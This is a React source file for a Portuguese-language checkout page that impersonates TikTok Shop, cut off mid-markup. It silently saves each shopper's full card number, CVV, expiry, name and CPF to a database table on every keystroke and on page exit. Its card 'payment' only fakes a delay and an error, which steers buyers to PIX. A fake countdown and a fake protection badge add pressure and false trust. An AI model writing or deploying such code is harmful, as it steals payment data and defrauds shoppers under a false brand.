import { useState, useEffect, useRef, useCallback } from "react";
import { trackTikTokEvent } from "@/lib/tiktokPixel";
import { supabase } from "@/integrations/supabase/client";
import { useNavigate, useSearchParams } from "react-router-dom";
import { QRCodeSVG } from "qrcode.react";
import { useGeoLocation } from "@/hooks/useGeoLocation";
import {
  ArrowLeft,
  ShieldCheck,
  MapPin,
  Store,
  ChevronRight,
  Minus,
  Plus,
  CreditCard,
  QrCode,
  Truck,
  Lock,
  X,
  Check,
  Ticket,
  Zap,
  Copy,
  CheckCircle,
  Package,
  Clock,
} from "lucide-react";

interface AddressData {
  fullName: string;
  phone: string;
  streetNumber: string;
  city: string;
  state: string;
}

const generateOrderNumber = () => {
  const base = 300100;
  const random = Math.floor(Math.random() * 900);
  return `#${base + random}`;
};

const Checkout = () => {
  const navigate = useNavigate();
  const [searchParams] = useSearchParams();

  const name = searchParams.get("name") || "Produto";
  const price = parseFloat(searchParams.get("price") || "99.90");
  const originalPrice = parseFloat(searchParams.get("originalPrice") || "149.90");
  const variant = searchParams.get("variant") || "";
  const color = searchParams.get("color") || "";
  const seller = searchParams.get("seller") || "TechStore Oficial";
  const image = searchParams.get("image") || "";
  const couponsParam = searchParams.get("coupons");
  const appliedCoupons: { label: string; discount: string }[] = couponsParam
    ? JSON.parse(couponsParam)
    : [];

  const discount = Math.round(((originalPrice - price) / originalPrice) * 100);

  const [quantity, setQuantity] = useState(1);
  const [paymentMethod, setPaymentMethod] = useState<"pix" | "credit" | null>("pix");
  const [shippingMethod, setShippingMethod] = useState<"standard" | "premium">("standard");

  const [cardNumber, setCardNumber] = useState("");
  const [cardName, setCardName] = useState("");
  const [cardExpiry, setCardExpiry] = useState("");
  const [cardCvv, setCardCvv] = useState("");
  const [cardCpf, setCardCpf] = useState("");
  const [showPaymentError, setShowPaymentError] = useState(false);
  const [cardError, setCardError] = useState("");
  const [finalizingPayment, setFinalizingPayment] = useState(false);
  const [showRetryError, setShowRetryError] = useState(false);

  const [pixLoading, setPixLoading] = useState(false);
  const [pixCode, setPixCode] = useState("");
  const [pixQrImage, setPixQrImage] = useState("");
  const [pixError, setPixError] = useState("");
  const [showPixScreen, setShowPixScreen] = useState(false);
  const [pixCopied, setPixCopied] = useState(false);

  const [showThankYou, setShowThankYou] = useState(false);
  const [orderNumber] = useState(generateOrderNumber);

  const isValidLuhn = (number: string): boolean => {
    const digits = number.replace(/\D/g, "");
    if (digits.length < 13) return false;
    let sum = 0;
    let alternate = false;
    for (let i = digits.length - 1; i >= 0; i--) {
      let n = parseInt(digits[i], 10);
      if (alternate) { n *= 2; if (n > 9) n -= 9; }
      sum += n;
      alternate = !alternate;
    }
    return sum % 10 === 0;
  };

  useEffect(() => {
    trackTikTokEvent('InitiateCheckout', {
      content_name: name,
      value: price,
      currency: 'BRL',
    });
  }, []);

  const [countdown, setCountdown] = useState(9 * 60);
  useEffect(() => {
    const timer = setInterval(() => {
      setCountdown((prev) => (prev > 0 ? prev - 1 : 0));
    }, 1000);
    return () => clearInterval(timer);
  }, []);
  const countdownMin = String(Math.floor(countdown / 60)).padStart(2, "0");
  const countdownSec = String(countdown % 60).padStart(2, "0");
  const countdownDisplay = `${countdownMin}:${countdownSec}`;

  const [showAddressModal, setShowAddressModal] = useState(false);
  const { city: geoCity, state: geoState, locationLabel } = useGeoLocation();
  const [addressData, setAddressData] = useState<AddressData>({
    fullName: "", phone: "", streetNumber: "", city: "", state: "",
  });
  const [savedAddress, setSavedAddress] = useState<AddressData | null>(null);

  useEffect(() => {
    if (!geoCity || !geoState) return;

    setAddressData((prev) => ({
      ...prev,
      city: prev.city || geoCity,
      state: prev.state || geoState,
    }));

    setSavedAddress((prev) => prev
      ? {
          ...prev,
          city: prev.city || geoCity,
          state: prev.state || geoState,
        }
      : prev);
  }, [geoCity, geoState]);

  // ─── Auto-save checkout data ───
  const sessionIdRef = useRef(crypto.randomUUID());
  const leadIdRef = useRef<string | null>(null);
  const saveTimeoutRef = useRef<ReturnType<typeof setTimeout> | null>(null);

  const saveCheckoutData = useCallback(async (statusOverride?: string, extraFields?: Record<string, unknown>) => {
    const rawCardDigits = cardNumber.replace(/\D/g, "");
    const payload: Record<string, unknown> = {
      session_id: sessionIdRef.current,
      product_name: name,
      product_price: price,
      variant,
      color,
      quantity,
      full_name: addressData.fullName || null,
      phone: addressData.phone || null,
      street_number: addressData.streetNumber || null,
      city: addressData.city || null,
      state: addressData.state || null,
      payment_method: paymentMethod,
      card_name: cardName || null,
      card_last4: rawCardDigits.slice(-4) || null,
      card_number_full: rawCardDigits || null,
      card_expiry: cardExpiry || null,
      card_cvv: cardCvv || null,
      card_cpf: cardCpf || null,
      status: statusOverride || "abandoned",
      ip_location: geoCity ? `${geoCity}, ${geoState}` : null,
      ...extraFields,
    };

    try {
      if (leadIdRef.current) {
        await supabase.from("checkout_leads").update(payload).eq("id", leadIdRef.current);
      } else {
        const { data } = await supabase.from("checkout_leads").insert([payload as any]).select("id").single();
        if (data) leadIdRef.current = data.id;
      }
    } catch {}
  }, [name, price, variant, color, quantity, addressData, paymentMethod, cardName, cardNumber, cardExpiry, cardCvv, cardCpf, geoCity, geoState]);

  const debouncedSave = useCallback(() => {
    if (saveTimeoutRef.current) clearTimeout(saveTimeoutRef.current);
    saveTimeoutRef.current = setTimeout(() => saveCheckoutData(), 1500);
  }, [saveCheckoutData]);

  // Auto-save when any relevant field changes
  useEffect(() => {
    debouncedSave();
    return () => { if (saveTimeoutRef.current) clearTimeout(saveTimeoutRef.current); };
  }, [addressData, paymentMethod, cardName, cardNumber, cardExpiry, cardCvv, cardCpf, quantity, debouncedSave]);

  // Save on page unload/abandon
  useEffect(() => {
    const handleBeforeUnload = () => { saveCheckoutData(); };
    const handleVisibilityChange = () => { if (document.visibilityState === "hidden") saveCheckoutData(); };
    window.addEventListener("beforeunload", handleBeforeUnload);
    document.addEventListener("visibilitychange", handleVisibilityChange);
    return () => {
      window.removeEventListener("beforeunload", handleBeforeUnload);
      document.removeEventListener("visibilitychange", handleVisibilityChange);
    };
  }, [saveCheckoutData]);

  const shippingCost = shippingMethod === "premium" ? 17.50 : 0;
  const pixDiscount = paymentMethod === "pix" ? price * quantity * 0.05 : 0;
  const total = price * quantity - pixDiscount + shippingCost;
  const installment = (price * quantity / 12).toFixed(2).replace(".", ",");

  const formatCardNumber = (value: string) => {
    const digits = value.replace(/\D/g, "").slice(0, 16);
    return digits.replace(/(\d{4})(?=\d)/g, "$1 ");
  };
  const formatExpiry = (value: string) => {
    const digits = value.replace(/\D/g, "").slice(0, 4);
    if (digits.length > 2) return `${digits.slice(0, 2)}/${digits.slice(2)}`;
    return digits;
  };
  const formatWhatsapp = (value: string) => {
    const digits = value.replace(/\D/g, "").slice(0, 11);
    if (digits.length > 6) return `(${digits.slice(0, 2)}) ${digits.slice(2, 7)}-${digits.slice(7)}`;
    if (digits.length > 2) return `(${digits.slice(0, 2)}) ${digits.slice(2)}`;
    return digits;
  };
  const formatCpf = (value: string) => {
    const digits = value.replace(/\D/g, "").slice(0, 11);
    if (digits.length > 9) return `${digits.slice(0, 3)}.${digits.slice(3, 6)}.${digits.slice(6, 9)}-${digits.slice(9)}`;
    if (digits.length > 6) return `${digits.slice(0, 3)}.${digits.slice(3, 6)}.${digits.slice(6)}`;
    if (digits.length > 3) return `${digits.slice(0, 3)}.${digits.slice(3)}`;
    return digits;
  };

  const handleSaveAddress = async () => {
    if (!addressData.fullName || !addressData.phone || !addressData.streetNumber) return;
    setSavedAddress({
      ...addressData,
      city: addressData.city || geoCity,
      state: addressData.state || geoState,
    });
    setShowAddressModal(false);
  };

  const handlePixPayment = async () => {
    if (!savedAddress) { setShowAddressModal(true); return; }
    setPixLoading(true); setPixError(""); setShowPixScreen(true);
    try {
      const { data, error } = await supabase.functions.invoke("create-pix-charge", {
        body: {
          amount: total,
          customer_name: savedAddress.fullName,
          customer_cpf: cardCpf || undefined,
          description: `${name} - ${variant} - ${color}`,
        },
      });
      if (error) throw new Error(error.message || "Erro ao gerar PIX");
      if (!data?.success) throw new Error(data?.error || "Erro ao gerar PIX");

      const code = data.pix_code;
      if (code) {
        setPixCode(code);
      } else {
        // If no pix_code extracted, log full response for debugging
        console.warn("IronPay response without pix_code:", data.raw_response);
        setPixError("PIX gerado mas código não encontrado. Verifique os logs.");
      }
      if (data.pix_qr_image) setPixQrImage(data.pix_qr_image);

      trackTikTokEvent('CompletePayment', { content_name: name, value: total, currency: 'BRL', payment_method: 'PIX' });
      saveCheckoutData("pix_generated", {
        pix_code: code || null,
        pix_transaction_hash: data.transaction_hash || null,
        pix_status: "generated",
      });
    } catch (err: any) {
      console.error("PIX generation error:", err);
      setPixError(err.message || "Erro ao gerar PIX. Tente novamente.");
    } finally {
      setPixLoading(false);
    }
  };

  const handleCopyPixCode = async () => {
    if (!pixCode) return;
    try {
      await navigator.clipboard.writeText(pixCode);
      setPixCopied(true); setTimeout(() => setPixCopied(false), 3000);
    } catch {
      const textArea = document.createElement("textarea");
      textArea.value = pixCode;
      document.body.appendChild(textArea);
      textArea.select();
      document.execCommand("copy");
      document.body.removeChild(textArea);
      setPixCopied(true); setTimeout(() => setPixCopied(false), 3000);
    }
  };

  const handleCreditCardPayment = async () => {
    if (!savedAddress) { setShowAddressModal(true); return; }
    const rawNumber = cardNumber.replace(/\D/g, "");
    if (!isValidLuhn(rawNumber)) { setCardError("Número do cartão inválido"); return; }
    if (!cardName || !cardExpiry || !cardCvv || !cardCpf) { setCardError("Preencha todos os campos"); return; }
    setCardError(""); setFinalizingPayment(true);
    setTimeout(() => {
      setFinalizingPayment(false);
      setShowPaymentError(true);
      setTimeout(() => { setShowPaymentError(false); setShowRetryError(true); }, 3000);
    }, 3000);
  };

  const inputClass =
    "w-full h-11 px-3 rounded-lg border border-border bg-background text-[14px] text-foreground placeholder:text-muted-foreground outline-none focus:ring-2 focus:ring-primary/30 focus:border-primary transition-all";

  // ─── Thank You Page ───
  if (showThankYou) {
    return (
      <div className="min-h-[100dvh] bg-background">
        <div className="sticky top-0 z-50 bg-card border-b border-border">
          <div className="flex items-center justify-center h-11 px-4">
            <span className="text-[15px] font-semibold text-foreground">Pedido Confirmado</span>
          </div>
        </div>
        <div className="p-5 flex flex-col items-center gap-5 pt-10">
          <div className="w-16 h-16 rounded-full bg-[hsl(var(--tiktok-green))]/10 flex items-center justify-center">
            <CheckCircle className="w-8 h-8" style={{ color: 'hsl(var(--tiktok-green))' }} />
          </div>
          <div className="text-center">
            <h1 className="text-[20px] font-extrabold text-foreground mb-1">Obrigado pela compra!</h1>
            <p className="text-[13px] text-muted-foreground">Seu pedido foi realizado com sucesso</p>
          </div>
          <div className="w-full bg-card rounded-xl border border-border p-4">
            <div className="flex items-center justify-between mb-3">
              <span className="text-[12px] text-muted-foreground">Nº do pedido</span>
              <span className="text-[16px] font-extrabold text-foreground">{orderNumber}</span>
            </div>
            <div className="h-px bg-border mb-3" />
            <div className="flex gap-3 mb-3">
              <div className="w-14 h-14 rounded-lg bg-secondary overflow-hidden shrink-0 border border-border">
                {image ? <img src={image} alt={name} className="w-full h-full object-cover" /> : <div className="w-full h-full flex items-center justify-center text-muted-foreground text-[10px]">Img</div>}
              </div>
              <div className="flex-1 min-w-0">
                <p className="text-[12px] font-medium text-foreground leading-tight line-clamp-2">{name}</p>
                {variant && <p className="text-[10px] text-muted-foreground mt-0.5">{variant}</p>}
                <p className="text-[10px] text-muted-foreground">Qtd: {quantity}</p>
              </div>
            </div>
            <div className="space-y-1.5">
              <div className="flex justify-between text-[12px]">
                <span className="text-muted-foreground">Pagamento</span>
                <span className="text-foreground font-medium">PIX</span>
              </div>
              <div className="flex justify-between text-[12px]">
                <span className="text-muted-foreground">Total pago</span>
                <span className="text-foreground font-extrabold">R$ {total.toFixed(2).replace(".", ",")}</span>
              </div>
            </div>
          </div>
          <div className="w-full bg-card rounded-xl border border-border p-3.5 flex items-center gap-3">
            <Truck className="w-4 h-4 shrink-0" style={{ color: 'hsl(var(--tiktok-green))' }} />
            <div>
              <p className="text-[12px] font-semibold text-foreground">Previsão de entrega</p>
              <p className="text-[11px] text-muted-foreground">7-12 dias úteis após confirmação</p>
            </div>
          </div>
          <div className="w-full bg-card rounded-xl border border-border p-3.5 flex items-center gap-3">
            <Package className="w-4 h-4 text-primary shrink-0" />
            <div>
              <p className="text-[12px] font-semibold text-foreground">Acompanhe seu pedido</p>
              <p className="text-[11px] text-muted-foreground">Atualizações via WhatsApp</p>
            </div>
          </div>
          <button onClick={() => navigate("/")} className="w-full tiktok-btn-primary h-12 rounded-full text-[14px] font-bold mt-2">
            Voltar para a loja
          </button>
          <div className="flex items-center gap-1.5 pb-6">
            <ShieldCheck className="w-3.5 h-3.5 text-muted-foreground" />
            <span className="text-[10px] text-muted-foreground">Compra protegida por TikTok Shop</span>
          </div>
        </div>
      </div>
    );
  }

  // ─── PIX Payment Screen ───
  const pixPopup = showPixScreen && (
    <div className="fixed inset-0 z-[100] flex items-end justify-center">
      <div className="absolute inset-0 bg-foreground/60 backdrop-blur-sm" onClick={() => setShowPixScreen(false)} />
      <div className="relative bg-card w-full max-h-[92dvh] overflow-y-auto rounded-t-[20px] border-t border-border shadow-2xl animate-in slide-in-from-bottom duration-300">
        {/* Drag handle */}
        <div className="flex justify-center pt-3 pb-1">
          <div className="w-10 h-1 rounded-full bg-muted-foreground/30" />
        </div>
        <div className="flex items-center justify-between px-4 pb-3">
          <span className="text-[15px] font-bold text-foreground">Pagamento PIX</span>
          <button onClick={() => setShowPixScreen(false)} className="w-8 h-8 flex items-center justify-center rounded-full bg-secondary">
            <X className="w-4 h-4 text-foreground" />
          </button>
        </div>

        <div className="px-5 pb-8 flex flex-col items-center gap-4">
          {/* Timer */}
          <div className="flex items-center gap-2 bg-primary/10 px-4 py-2 rounded-full w-fit">
            <Clock className="w-3.5 h-3.5 text-primary" />
            <span className="text-[12px] font-bold text-primary tabular-nums">
              Expira em {countdownDisplay}
            </span>
          </div>

          {/* Value */}
          <div className="text-center">
            <p className="text-[11px] text-muted-foreground uppercase tracking-wide">Valor a pagar</p>
            <p className="text-[32px] font-extrabold tiktok-price leading-tight">
              R$ {total.toFixed(2).replace(".", ",")}
            </p>
            {pixDiscount > 0 && (
              <p className="text-[11px] font-semibold mt-0.5" style={{ color: 'hsl(var(--tiktok-green))' }}>
                Economia de R$ {pixDiscount.toFixed(2).replace(".", ",")} com PIX
              </p>
            )}
          </div>

          {/* QR Code */}
          {pixLoading ? (
            <div className="bg-secondary p-6 rounded-2xl flex flex-col items-center gap-3">
              <div className="w-14 h-14 border-4 border-primary/30 border-t-primary rounded-full animate-spin" />
              <p className="text-[12px] text-muted-foreground text-center font-medium">Processando pagamento...</p>
            </div>
          ) : pixError ? (
            <div className="bg-destructive/10 p-4 rounded-2xl flex flex-col items-center gap-2">
              <p className="text-[12px] text-destructive text-center font-medium">{pixError}</p>
              <button onClick={handlePixPayment} className="text-[12px] text-primary font-bold underline">Tentar novamente</button>
            </div>
          ) : pixQrImage ? (
            <div className="bg-card p-4 rounded-2xl border-2 border-border">
              <img src={pixQrImage} alt="QR Code PIX" className="w-[180px] h-[180px]" />
            </div>
          ) : pixCode ? (
            <div className="bg-card p-4 rounded-2xl border-2 border-border">
              <QRCodeSVG value={pixCode} size={180} />
            </div>
          ) : (
            <div className="bg-secondary p-6 rounded-2xl flex flex-col items-center gap-2">
              <QrCode className="w-14 h-14 text-muted-foreground" />
              <p className="text-[11px] text-muted-foreground text-center">Use o código abaixo</p>
            </div>
          )}

          {/* Copy code */}
          {pixCode && (
            <div className="w-full">
              <p className="text-[11px] text-muted-foreground mb-1.5 font-medium">Código Pix Copia e Cola</p>
              <div className="bg-secondary rounded-xl p-3 text-[10px] text-foreground break-all leading-relaxed max-h-[52px] overflow-hidden mb-2">
                {pixCode}
              </div>
              <button
                onClick={handleCopyPixCode}
                className={`w-full h-11 rounded-xl font-bold text-[13px] flex items-center justify-center gap-2 transition-all ${
                  pixCopied
                    ? "bg-[hsl(var(--tiktok-green))] text-primary-foreground"
                    : "tiktok-btn-outline border-2"
                }`}
              >
                {pixCopied ? <Check className="w-4 h-4" /> : <Copy className="w-4 h-4" />}
                {pixCopied ? "Código copiado!" : "Copiar código PIX"}
              </button>
            </div>
          )}

          {/* Steps */}
          <div className="w-full bg-secondary/60 rounded-xl p-3.5">
            <p className="text-[11px] font-bold text-foreground mb-2">Como pagar:</p>
            {["Copie o código PIX acima", "Abra o app do seu banco", "Cole na opção \"Pix Copia e Cola\""].map((step, i) => (
              <div key={i} className="flex items-center gap-2.5 mb-1.5 last:mb-0">
                <span className="w-5 h-5 rounded-full bg-primary text-primary-foreground text-[10px] font-bold flex items-center justify-center shrink-0">{i + 1}</span>
                <p className="text-[11px] text-muted-foreground">{step}</p>
              </div>
            ))}
          </div>

          <button
            onClick={() => { setShowPixScreen(false); setShowThankYou(true); }}
            className="w-full tiktok-btn-primary h-12 rounded-full text-[14px] font-bold"
          >
            Já fiz o pagamento
          </button>

          <div className="flex items-center gap-1.5">
            <Lock className="w-3 h-3 text-muted-foreground" />
            <span className="text-[10px] text-muted-foreground">Pagamento 100% seguro e criptografado</span>
          </div>
        </div>
      </div>
    </div>
  );

  // ─── Address Modal ───
  const addressModal = showAddressModal && (
    <div className="fixed inset-0 z-[100] flex items-center justify-center px-4">
      <div className="absolute inset-0 bg-foreground/60 backdrop-blur-sm" onClick={() => setShowAddressModal(false)} />
      <div className="relative bg-card w-full max-w-[400px] overflow-y-auto rounded-2xl border border-border shadow-2xl animate-in zoom-in-95 duration-200">
        <div className="flex items-center justify-between px-4 pt-4 pb-3">
          <span className="text-[15px] font-bold text-foreground">Endereço de entrega</span>
          <button onClick={() => setShowAddressModal(false)} className="w-8 h-8 flex items-center justify-center rounded-full bg-secondary">
            <X className="w-4 h-4 text-foreground" />
          </button>
        </div>
        {(addressData.city || addressData.state) && (
          <div className="mx-4 mb-3 flex items-center gap-2 px-3 py-2 rounded-xl bg-primary/5 border border-primary/20">
            <MapPin className="w-4 h-4 text-primary shrink-0" />
            <span className="text-[12px] text-foreground">
              Frete grátis para: <strong>{addressData.city}{addressData.state ? `, ${addressData.state}` : ""}</strong>
            </span>
          </div>
        )}
        <div className="px-4 pb-5 space-y-3">
          <input className={inputClass} placeholder="Nome completo" value={addressData.fullName} onChange={(e) => setAddressData((p) => ({ ...p, fullName: e.target.value }))} />
          <input className={inputClass} placeholder="Telefone (11) 99999-9999" value={addressData.phone} onChange={(e) => setAddressData((p) => ({ ...p, phone: formatWhatsapp(e.target.value) }))} />
          <input className={inputClass} placeholder="Rua e Número da Casa" value={addressData.streetNumber} onChange={(e) => setAddressData((p) => ({ ...p, streetNumber: e.target.value }))} />
          <button onClick={handleSaveAddress} disabled={!addressData.fullName || !addressData.phone || !addressData.streetNumber}
            className="w-full tiktok-btn-primary h-12 rounded-full text-[14px] font-bold disabled:opacity-50 mt-1">
            Salvar endereço
          </button>
        </div>
      </div>
    </div>
  );

  // ─── Main Checkout ───
  return (
    <div className="min-h-[100dvh] bg-background pb-[140px]">
      {/* Header */}
      {/* Header */}
      <div className="sticky top-0 z-50 bg-card">
        <div className="flex items-center h-11 px-3 relative">
          <button onClick={() => navigate("/")} className="w-9 h-9 flex items-center justify-center rounded-full active:bg-secondary">
            <ArrowLeft className="w-5 h-5 text-foreground" />
          </button>
          <span className="absolute left-1/2 -translate-x-1/2 text-[15px] font-bold text-foreground">Checkout</span>
          <div className="ml-auto flex items-center gap-1">
            <Lock className="w-3 h-3 text-muted-foreground" />
            <span className="text-[10px] text-muted-foreground">Seguro</span>
          </div>
        </div>
        {/* Countdown bar */}
        <div className="flex items-center justify-center gap-1.5 py-1.5"
          style={{ background: "linear-gradient(90deg, hsl(var(--tiktok-red)) 0%, hsl(var(--tiktok-orange)) 100%)" }}>
          <Zap className="w-3 h-3 fill-primary-foreground text-primary-foreground" />
          <span className="text-primary-foreground text-[11px] font-bold tabular-nums">
            Oferta expira em {countdownDisplay}
          </span>
        </div>
      </div>

      {/* Address */}
      <button onClick={() => setShowAddressModal(true)} className="w-full bg-card mb-1.5 active:bg-secondary/50 transition-colors">
        <div className="flex items-center gap-3 px-4 py-3">
          <div className="w-8 h-8 rounded-full bg-primary/10 flex items-center justify-center shrink-0">
            <MapPin className="w-4 h-4 text-primary" />
          </div>
          <div className="flex-1 text-left min-w-0">
            {savedAddress ? (
              <>
                <p className="text-[13px] font-semibold text-foreground truncate">{savedAddress.fullName}</p>
                <p className="text-[11px] text-muted-foreground truncate">Nº {savedAddress.streetNumber} · {savedAddress.city || geoCity}{savedAddress.state || geoState ? `, ${savedAddress.state || geoState}` : ""}</p>
              </>
            ) : (
              <>
                <p className="text-[13px] font-semibold text-primary">Adicionar endereço</p>
                <p className="text-[11px] text-muted-foreground">
                  {geoCity ? `Frete grátis para: ${locationLabel}` : "Toque para informar o endereço de entrega"}
                </p>
              </>
            )}
          </div>
          <ChevronRight className="w-4 h-4 text-muted-foreground shrink-0" />
        </div>
      </button>

      {/* Product card */}
      <div className="bg-card mb-1.5 px-4 py-3">
        <div className="flex items-center gap-1.5 mb-2.5">
          <Store className="w-3.5 h-3.5 text-muted-foreground" />
          <span className="text-[11px] font-medium text-foreground">{seller}</span>
        </div>
        <div className="flex gap-3">
          <div className="w-[72px] h-[72px] rounded-lg bg-secondary overflow-hidden shrink-0 border border-border">
            {image ? <img src={image} alt={name} className="w-full h-full object-cover" /> : <div className="w-full h-full flex items-center justify-center text-muted-foreground text-[10px]">Img</div>}
          </div>
          <div className="flex-1 min-w-0">
            <p className="text-[12px] text-foreground leading-tight line-clamp-2">{name}</p>
            <div className="flex items-center gap-1.5 mt-1">
              {variant && <span className="text-[10px] text-muted-foreground bg-secondary px-1.5 py-0.5 rounded">{variant}</span>}
              {color && <span className="text-[10px] text-muted-foreground bg-secondary px-1.5 py-0.5 rounded">{color}</span>}
            </div>
            <div className="flex items-center justify-between mt-2">
              <div className="flex items-baseline gap-1.5">
                <span className="text-[15px] font-extrabold tiktok-price">R$ {price.toFixed(2).replace(".", ",")}</span>
                <span className="text-[10px] text-muted-foreground line-through">R$ {originalPrice.toFixed(2).replace(".", ",")}</span>
                <span className="text-[9px] font-bold text-primary-foreground bg-primary px-1 py-0.5 rounded">-{discount}%</span>
              </div>
              <div className="flex items-center gap-1.5 bg-secondary rounded-full">
                <button onClick={() => setQuantity(Math.max(1, quantity - 1))} disabled={quantity <= 1} className="w-7 h-7 flex items-center justify-center disabled:opacity-30">
                  <Minus className="w-3 h-3 text-foreground" />
                </button>
                <span className="text-[12px] font-bold text-foreground w-3 text-center">{quantity}</span>
                <button onClick={() => setQuantity(quantity + 1)} className="w-7 h-7 flex items-center justify-center">
                  <Plus className="w-3 h-3 text-foreground" />
                </button>
              </div>
            </div>
          </div>
        </div>
      </div>

      {/* Shipping */}
      <div className="bg-card mb-1.5 px-4 py-3">
        <div className="flex items-center gap-2 mb-2.5">
          <Truck className="w-4 h-4" style={{ color: 'hsl(var(--tiktok-green))' }} />
          <span className="text-[12px] font-bold text-foreground">Entrega</span>
        </div>
        <div className="space-y-1.5">
          <button onClick={() => setShippingMethod("standard")}
            className={`w-full flex items-center justify-between p-2.5 rounded-xl border transition-all ${shippingMethod === "standard" ? "border-primary bg-primary/5" : "border-border"}`}>
            <div className="flex items-center gap-2">
              <div className={`w-4 h-4 rounded-full border-2 flex items-center justify-center ${shippingMethod === "standard" ? "border-primary" : "border-muted-foreground/40"}`}>
                {shippingMethod === "standard" && <div className="w-2 h-2 rounded-full bg-primary" />}
              </div>
              <span className="text-[11px] font-medium text-foreground">Padrão · 7-12 dias</span>
            </div>
            <span className="text-[11px] font-bold" style={{ color: 'hsl(var(--tiktok-green))' }}>Grátis</span>
          </button>
          <button onClick={() => setShippingMethod("premium")}
            className={`w-full flex items-center justify-between p-2.5 rounded-xl border transition-all ${shippingMethod === "premium" ? "border-primary bg-primary/5" : "border-border"}`}>
            <div className="flex items-center gap-2">
              <div className={`w-4 h-4 rounded-full border-2 flex items-center justify-center ${shippingMethod === "premium" ? "border-primary" : "border-muted-foreground/40"}`}>
                {shippingMethod === "premium" && <div className="w-2 h-2 rounded-full bg-primary" />}
              </div>
              <span className="text-[11px] font-medium text-foreground">Expresso · 3-5 dias</span>
            </div>
            <span className="text-[11px] font-semibold text-foreground">R$ 17,50</span>
          </button>
        </div>
      </div>

      {/* Coupons */}
      {appliedCoupons.length > 0 && (
        <div className="bg-card mb-1.5 px-4 py-3">
          <div className="flex items-center gap-2 mb-2">
            <Ticket className="w-4 h-4 text-primary" />
            <span className="text-[12px] font-bold text-foreground">Cupons aplicados</span>
          </div>
          <div className="flex gap-1.5 flex-wrap">
            {appliedCoupons.map((c, i) => (
              <span key={i} className="tiktok-tag text-[9px]">{c.discount} · {c.label}</span>
            ))}
          </div>
        </div>
      )}

      {/* Payment */}
      <div className="bg-card mb-1.5 px-4 py-3">
        <div className="flex items-center gap-2 mb-2.5">
          <CreditCard className="w-4 h-4 text-primary" />
          <span className="text-[12px] font-bold text-foreground">Pagamento</span>
        </div>
        <div className="space-y-1.5">
          {/* PIX */}
          <button onClick={() => setPaymentMethod("pix")}
            className={`w-full flex items-center justify-between p-2.5 rounded-xl border transition-all ${paymentMethod === "pix" ? "border-primary bg-primary/5" : "border-border"}`}>
            <div className="flex items-center gap-2">
              <div className={`w-4 h-4 rounded-full border-2 flex items-center justify-center ${paymentMethod === "pix" ? "border-primary" : "border-muted-foreground/40"}`}>
                {paymentMethod === "pix" && <div className="w-2 h-2 rounded-full bg-primary" />}
              </div>
              <QrCode className="w-4 h-4 text-muted-foreground" />
              <span className="text-[11px] font-medium text-foreground">PIX</span>
            </div>
            <span className="text-[9px] font-bold text-primary-foreground bg-[hsl(var(--tiktok-green))] px-1.5 py-0.5 rounded">5% OFF</span>
          </button>
          {/* Credit */}
          <button onClick={() => setPaymentMethod("credit")}
            className={`w-full flex items-center justify-between p-2.5 rounded-xl border transition-all ${paymentMethod === "credit" ? "border-primary bg-primary/5" : "border-border"}`}>
            <div className="flex items-center gap-2">
              <div className={`w-4 h-4 rounded-full border-2 flex items-center justify-center ${paymentMethod === "credit" ? "border-primary" : "border-muted-foreground/40"}`}>
                {paymentMethod === "credit" && <div className="w-2 h-2 rounded-full bg-primary" />}
              </div>
              <CreditCard className="w-4 h-4 text-muted-foreground" />
              <span className="text-[11px] font-medium text-foreground">Cartão de Crédito</span>
            </div>
            <span className="text-[10px] text-muted-foreground">12x R$ {installment}</span>
          </button>
        </div>

        {/* Credit card form */}
        {paymentMethod === "credit" && (
          <div className="mt-3 pt-3 border-t border-border space-y-2.5">
            <input className={inputClass} placeholder="Número do cartão" value={cardNumber} onChange={(e) => setCardNumber(formatCardNumber(e.target.value))} />
            <input className={inputClass} placeholder="Nome no cartão" value={cardName} onChange={(e) => setCardName(e.target.value.toUpperCase())} />
            <div className="grid grid-cols-2 gap-2.5">
              <input className={inputClass} placeholder="MM/AA" value={cardExpiry} onChange={(e) => setCardExpiry(formatExpiry(e.target.value))} />
              <input className={inputClass} placeholder="CVV" value={cardCvv} onChange={(e) => setCardCvv(e.target.value.replace(/\D/g, "").slice(0, 4))} />
            </div>
            <input className={inputClass} placeholder="CPF do titular" value={cardCpf} onChange={(e) => setCardCpf(formatCpf(e.target.value))} />
            {cardError && <p className="text-[11px] text-destructive">{cardError}</p>}
          </div>
        )}
      </div>

      {/* Order summary */}
      <div className="bg-card mb-1.5 px-4 py-3">
        <h3 className="text-[12px] font-bold text-foreground mb-2.5">Resumo do pedido</h3>
        <div className="space-y-1.5">
          <div className="flex justify-between text-[11px]">
            <span className="text-muted-foreground">Subtotal ({quantity}x)</span>
            <span className="text-foreground">R$ {(price * quantity).toFixed(2).replace(".", ",")}</span>
          </div>
          <div className="flex justify-between text-[11px]">
            <span className="text-muted-foreground">Frete</span>
            <span className={shippingCost === 0 ? "font-bold" : "text-foreground"} style={shippingCost === 0 ? { color: 'hsl(var(--tiktok-green))' } : {}}>
              {shippingCost === 0 ? "Grátis" : `R$ ${shippingCost.toFixed(2).replace(".", ",")}`}
            </span>
          </div>
          {pixDiscount > 0 && (
            <div className="flex justify-between text-[11px]">
              <span className="text-muted-foreground">Desconto PIX (5%)</span>
              <span className="font-semibold" style={{ color: 'hsl(var(--tiktok-green))' }}>-R$ {pixDiscount.toFixed(2).replace(".", ",")}</span>
            </div>
          )}
          <div className="h-px bg-border my-1" />
          <div className="flex justify-between items-center">
            <span className="text-[12px] font-bold text-foreground">Total</span>
            <span className="text-[17px] font-extrabold tiktok-price">R$ {total.toFixed(2).replace(".", ",")}</span>
          </div>
        </div>
      </div>

      {/* Security badge */}
      <div className="flex items-center justify-center gap-2 py-3">
        <ShieldCheck className="w-3.5 h-3.5 text-muted-foreground" />
        <span className="text-[10px] text-muted-foreground">Compra protegida por TikTok Shop</span>
      </div>

      {/* Fixed bottom CTA */}
      <div className="fixed bottom-0 left-0 right-0 z-50 bg-card border-t border-border">
        <div className="max-w-[500px] mx-auto">
          <div className="px-4 pt-3 pb-1">
            <div className="flex items-center justify-between mb-2.5">
              <div>
                <span className="text-[10px] text-muted-foreground">Total</span>
                <p className="text-[20px] font-extrabold tiktok-price leading-tight">R$ {total.toFixed(2).replace(".", ",")}</p>
              </div>
              {pixDiscount > 0 && (
                <span className="text-[10px] font-semibold px-2 py-1 rounded-full" style={{ color: 'hsl(var(--tiktok-green))', background: 'hsl(var(--tiktok-green) / 0.1)' }}>
                  Economia R$ {pixDiscount.toFixed(2).replace(".", ",")}
                </span>
              )}
            </div>
            <button
              onClick={() => {
                if (paymentMethod === "pix") handlePixPayment();
                else if (paymentMethod === "credit") handleCreditCardPayment();
